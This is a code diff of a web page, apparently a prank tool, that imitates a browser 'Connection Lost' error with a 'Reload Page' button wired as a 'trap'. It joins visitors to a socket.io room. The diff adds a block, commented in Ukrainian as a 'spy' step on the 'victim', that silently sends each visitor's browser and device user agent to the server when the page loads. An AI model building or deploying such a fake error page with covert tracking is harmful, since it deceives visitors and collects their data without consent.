@@ -15,17 +15,15 @@
 <body>
     <div id="fake-error">
         <svg style="width: 64px; fill: #fa3e3e;" viewBox="0 0 24 24"><path d="M23.64 7c-.45-.34-4.93-4-11.64-4-1.5 0-2.89.19-4.15.48L18.18 13.8 23.64 7zm-6.6 8.22L3.27 1.44 2 2.72l2.05 2.06C1.91 5.17.51 6.67.36 6.8c-.45.34 3.99 4 11.64 4 2.19 0 4.1-.38 5.76-1.01l4.5 4.51 1.27-1.27-6.49-6.51z"/></svg>
-        
         <h2 id="err-title">Connection Lost</h2>
-        <p id="err-desc">Please check your internet connection.</p>
+        <p id="err-desc">Checking network protocols...</p>
         <button id="activate-trap">Reload Page</button>
     </div>
-
     <div id="prank-view"></div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        // --- ПЕРЕКЛАД ---
+        // Переклад інтерфейсу
         const langData = {
             'uk': { title: "Немає з'єднання", desc: "Перевірте підключення до Інтернету.", btn: "Оновити сторінку" },
             'ru': { title: "Нет подключения", desc: "Проверьте подключение к Интернету.", btn: "Обновить страницу" },
@@ -33,13 +31,12 @@
         };
         const userLang = navigator.language.slice(0, 2);
         const t = langData[userLang] || langData['en'];
-
         document.getElementById('err-title').innerText = t.title;
         document.getElementById('err-desc').innerText = t.desc;
         document.getElementById('activate-trap').innerText = t.btn;
-        document.title = t.title; // Змінюємо заголовок вкладки
+        document.title = t.title;
 
-        // --- ЛОГІКА ---
+        // Логіка
         const socket = io();
         const id = new URLSearchParams(window.location.search).get('id');
         let audio = new Audio();
@@ -50,6 +47,12 @@
         }).catch(() => {});
 
         socket.emit('join-room', id);
+
+        // 🔥 ШПИГУН: Відправляємо дані про жертву (тільки один раз при вході)
+        socket.emit('victim-joined', {
+            roomId: id,
+            userAgent: navigator.userAgent // Інфа про браузер і телефон
+        });
 
         document.getElementById('activate-trap').onclick = () => {
             document.getElementById('fake-error').style.display = 'none';
